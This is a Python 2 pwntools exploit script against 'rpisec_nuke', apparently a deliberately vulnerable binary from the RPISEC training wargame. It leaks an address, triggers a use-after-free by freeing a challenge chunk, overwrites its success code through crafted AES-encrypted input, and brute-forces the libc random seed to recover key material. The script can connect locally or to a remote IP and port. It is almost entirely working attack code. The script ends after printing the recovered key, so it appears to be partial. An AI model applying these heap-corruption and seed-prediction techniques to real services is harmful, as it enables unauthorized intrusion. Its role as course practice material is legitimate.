#!/usr/bin/env python2

from pwn import *
import time
import ctypes
import re
import string
from Crypto.Cipher import AES

def uncolorize(func):

    def wrapper(*args, **kwargs):
        ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
        output = func(*args, **kwargs)
        return ansi_escape.sub('', output)

    return wrapper

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337

settings = {

    # Path to binary
    "binary"        : "./rpisec_nuke",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Uncolorize setup for easy parsing
    p.recv = uncolorize(p.recv)

    # Load libc
    libc = ctypes.CDLL("libc.so.6")

    # Get &wopr
    p.recvuntil("LAUNCH SESSION - ")
    wopr = int(p.recvuntil("]=", drop=True))
    log.info("WOPR : {}".format(hex(wopr)))

    # Free wopr->challenge3
    log.info("Freeing chunk from #3...")
    p.sendlineafter("MENU SELECTION: ", "3")
    p.sendlineafter("PLEASE CONFIRM LAUNCH SESSION #: ", "FAIL")
    p.sendlineafter("PRESS ENTER TO RETURN TO MENU ", "")

    # Overwrite wopr->challenge3->success_code chunk with wopr->challenge2->enc_user
    # We need to find a plaintext which encrypted results in p32(0x31337) * 8
    # This will overwrite the challenge3->success_code bypassing the check
    # for key #3
    log.info("Overwriting #3 success code through #2 ...")
    iv = flat([0x0FEEDFACF, 0xDEADC0DE, 0xBABECAFE, 0xA55B00B])
    key = "A" * 16
    enc = AES.new(key, AES.MODE_CBC, iv)
    plaintext = enc.decrypt(p32(0x31337) * 8)
    p.sendlineafter("MENU SELECTION: ", "2")
    p.sendlineafter("ENTER AES-128 CRYPTO KEY: ", enhex(key))
    p.sendlineafter("ENTER LENGTH OF DATA (16 OR 32): ", "32")
    p.sendlineafter("ENTER DATA TO ENCRYPT: ", plaintext)

    # Leak xor'd key #2 and validate #3
    log.info("Leaking key #2 and validating #3 ...")
    p.sendlineafter("MENU SELECTION: ", "3")
    p.recvuntil("  CHALLENGE (64 Bytes):")
    p.recvline()

    leaked_numbers = [p.recvline().strip().replace(".", "") for i in range(4)]
    leaked_numbers = unhex(''.join(leaked_numbers))
    leaked_numbers = unpack_many(leaked_numbers, word_size=32)

    # Calculate seed
    log.info("Calculating seed ...")
    p.recvuntil("TIME NOW: ")
    now = int(p.recvline())
    while True:
        libc.srand(wopr + now)
        random_numbers = [libc.rand() for i in range(0x10)]
        chall2 = flat([leaked_numbers[i] ^ random_numbers[i] for i in range(0x10)])
        chall2_data = enhex(chall2[:0x20])
        chall2_iv = enhex(chall2[0x20:0x30])
        chall2_key = chall2[0x30:0x40]

        if enhex(p32(0x31337)) in chall2_iv:
            break

        now -= 1

    log.info("Time : {}".format(hex(now)))
    log.info("Seed : {}".format(hex(wopr + now)))
    log.info("Chall #2 Key : {}".format(enhex(chall2_key)))

# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process([binary.path], env={"LD_PRELOAD" : "./sleep_bypass.so"})

    if args['REMOTE']:
        if not all([args.IP, args.PORT]):
            log.warning("Missing IP/PORT arguments.")
            exit()

        p = remote(args.IP, int(args.PORT))

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
